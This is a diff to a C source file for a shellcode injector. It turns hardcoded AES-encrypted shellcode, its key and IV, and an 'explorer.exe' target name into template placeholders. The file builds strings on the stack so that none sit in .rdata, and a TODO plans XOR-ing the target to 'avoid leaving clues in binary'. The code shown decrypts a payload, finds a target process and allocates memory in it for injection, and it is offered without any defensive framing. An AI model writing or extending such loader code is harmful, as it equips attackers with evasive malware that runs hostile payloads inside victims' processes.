@@ -22,25 +22,25 @@
 // SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
 // ============================================================
 
-unsigned char aes_key[] = {
-    0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
-    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
-    0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
-    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60};
+// unsigned char aes_key[] = {
+//     0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
+//     0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
+//     0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
+//     0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60};
 
-unsigned char aes_iv[] = {
-    0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
-    0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90};
+// unsigned char aes_iv[] = {
+//     0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
+//     0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90};
 
-unsigned char encrypted_shellcode[] = {
-    // Paste AES-encrypted shellcode from Python script
-    0x00 // placeholder
-};
+// unsigned char encrypted_shellcode[] = {
+//     // Paste AES-encrypted shellcode from Python script
+//     0x00 // placeholder
+// };
 
-// unsigned char encrypted_shellcode[] = {${SHELLCODE}};
-// unsigned char aes_key[] = {${KEY}};
-// unsigned char aes_iv[] = {${IV}};
-SIZE_T original_shellcode_size = 236; // Update from Python output
+unsigned char encrypted_shellcode[] = {${SHELLCODE}};
+unsigned char aes_key[] = {${KEY}};
+unsigned char aes_iv[] = {${IV}};
+// SIZE_T original_shellcode_size = 236; // Update from Python output
 
 // ============================================================
 // SECTION 2: Stack Strings (no strings in .rdata)
@@ -199,21 +199,22 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
 
 DWORD FindTargetProcess()
 {
+    // TODO: replace with xored TARGET_PROCESS to enable dynamicism and avoid leaving clues in binary`
     // Build target name on stack
-    char target[16];
-    target[0] = 'e';
-    target[1] = 'x';
-    target[2] = 'p';
-    target[3] = 'l';
-    target[4] = 'o';
-    target[5] = 'r';
-    target[6] = 'e';
-    target[7] = 'r';
-    target[8] = '.';
-    target[9] = 'e';
-    target[10] = 'x';
-    target[11] = 'e';
-    target[12] = '\0';
+    // char target[16];
+    // target[0] = 'e';
+    // target[1] = 'x';
+    // target[2] = 'p';
+    // target[3] = 'l';
+    // target[4] = 'o';
+    // target[5] = 'r';
+    // target[6] = 'e';
+    // target[7] = 'r';
+    // target[8] = '.';
+    // target[9] = 'e';
+    // target[10] = 'x';
+    // target[11] = 'e';
+    // target[12] = '\0';
 
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe = {sizeof(pe)};
@@ -221,7 +222,7 @@ DWORD FindTargetProcess()
     {
         do
         {
-            if (_stricmp(pe.szExeFile, target) == 0)
+            if (_stricmp(pe.szExeFile, "${TARGET_PROCESS}") == 0)
             {
                 CloseHandle(snap);
                 return pe.th32ProcessID;
@@ -444,7 +445,8 @@ int main()
 
     // Allocate RW memory in target
     PVOID remoteBase = NULL;
-    SIZE_T regionSize = original_shellcode_size + 4096; // Extra padding
+    SIZE_T original_shellcode_size = sizeof(encrypted_shellcode);
+    SIZE_T regionSize = (decrypted_len + 4096) & ~0xFFF; // Extra padding
     NtAlloc(hProcess, &remoteBase, 0, &regionSize,
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
